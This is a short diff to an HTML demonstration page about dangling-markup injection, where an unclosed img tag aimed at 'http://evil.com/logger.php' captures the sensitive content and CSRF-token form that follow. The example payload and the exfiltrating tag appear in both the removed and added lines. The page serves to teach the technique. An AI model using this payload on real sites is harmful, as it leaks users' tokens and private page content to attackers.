@@ -1,10 +1,11 @@
 <!-- applicability - if used in URL - will open a page along with csrf token-->
 
 <html>
-<h1> some title here </h1><br>
-There is a page<br>
-here is the broken input:<input name="test" value="hack"><img src="http://evil666.com/logger.php?
+Unclosed img tag<br>
+Suppose the attacker was able to inject the following into a vulnerable input: &quot;"&gt;&lt;img src="http://evil.com/logger.php?log= <br>
 <br>
+So here is the broken input after which some sensitive content goes on:<br>
+<input name="test" value="hack"><img src="http://evil.com/logger.php?
 some sensitive content<br>
 <form action="/action.php"/>
 <br>some
